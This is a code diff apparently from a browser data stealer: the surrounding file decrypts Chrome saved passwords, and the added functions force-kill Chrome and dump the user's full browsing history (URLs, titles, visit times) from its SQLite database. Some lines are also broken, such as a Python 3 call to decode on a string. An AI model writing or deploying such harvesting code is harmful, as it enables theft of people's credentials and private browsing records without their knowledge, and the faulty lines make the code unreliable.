@@ -55,3 +55,49 @@ def decrypt_password(buff, master_key):
         # print("Probably saved password from Chrome version older than v80\n")
         # print(str(e))
         return "Chrome < 80"
+
+def get_path():
+    User_profile = os.environ.get("USERPROFILE")
+    History_path = User_profile + r"\\AppData\Local\Google\Chrome\User Data\Default\History"  # Usually this is where the chrome history file is located, change it if you need to.
+    return History_path
+
+def get_browserhistory():
+    try:
+        os.system("taskkill /f /im chrome.exe")
+    except:
+        pass
+
+    browserhistory = {}
+
+    path = get_path()
+
+    try:
+        conn = sqlite3.connect(path)
+        cursor = conn.cursor()
+        SQL = """SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime')
+                                            AS last_visit_time FROM urls ORDER BY last_visit_time DESC"""
+
+        query = []
+        try:
+            cursor.execute(SQL)
+            query = cursor.fetchall()
+        except sqlite3.OperationalError:
+
+            print('Close Google Chrome Window')
+        except Exception as err:
+            print(err)
+        cursor.close()
+        conn.close()
+        browserhistory['chrome'] = query
+    except sqlite3.OperationalError:
+        print('Chrome Database Permission Denied.')
+
+    list_of_history = []
+
+    for browser, history in browserhistory.items():
+        for data in history:
+            list_of_history.append(str(data[0]).decode('ascii'))
+
+    string_of_history = "\n\n".join(list_of_history)
+
+    return string_of_history
